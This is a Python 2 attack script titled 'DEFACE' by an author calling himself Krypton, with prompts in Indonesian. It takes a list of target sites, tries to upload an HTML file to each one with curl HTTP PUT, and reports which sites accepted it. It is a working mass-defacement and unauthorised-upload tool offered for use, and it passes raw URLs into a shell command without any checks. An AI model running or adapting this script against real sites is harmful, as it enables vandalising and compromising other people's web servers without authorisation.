#!/usr/bin/python2
#jgn recode
#author Krypton
import os,requests,sys,random,time
P = '\x1b[0m'
M = '\x1b[91m'
H = '\x1b[92m'
K = '\x1b[93m'
B = '\x1b[94m'
U = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
star='\xe2\xad\x90'
def jalan(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.1)
def hack(vul,file,n):
	try:
		a=open(vul).readlines()
		hit=len(a)
		b=open('lol.html','w').write('krypton')
		while n<hit:
			stri=a[n]
			cdk=stri.replace('\n','')
			os.system('curl -sT lol.html '+cdk+'>/dev/null')
			tes=requests.get(cdk+'/lol.html').text
			if tes=='krypton':
				jalan(H+'[ vuln ] '+U+a[n]+'/'+file+H+' [ sukses ]')
				n+=1
			else:
				jalan(K+'[Not Vuln] '+U+a[n]+'/'+file+K+' [ gagal ]')
				n+=1
		jalan('-----------'*2+krypton+'---------'*2)
	except requests.exceptions.ConnectionError:
		jalan(M+'[ fail ] '+U+a[n]+'/'+file+M+' [ gagal ]')
		n+=1
		hack(vul,file,n)
def inputan():
	try:
		os.system('clear')
		os.system('toilet -f mono9 -F gay " DEFACE"')
		print(H+'---------------------------------'*2)
		print(H+'\n\tAUTHOR: '+K+'KRYPTON\n'+B+'\tkosongkan wordlist untuk memakai\n\tweb vuln yg telah di tetapkan di sc ini')
		print(H+'---------------------------------'*2)
		b=raw_input(M+'\thtml \t: '+K)
		c=raw_input(M+'\twordlist web vuln : '+K)
		jalan('---------------'*2+'INJECTION'+'-------------'*2)
		if file(b):
			if (c=='' or c==' '):
				hack('.vuln',b,0)
			elif file(c):
				hack(c,b,0)
			else:
				jalan('[x] salah')
				inputan()
		else:
			jalan('[x] yg anda masukan salah')
			inputan()
	except IOError:
		jalan('[x] file tidak ada')
		inputan()

def ko():
	jalan(H+'\n\tSelamat tinggal bebqu :*'+P)
try:
	inputan()
except KeyboardInterrupt:
	ko()
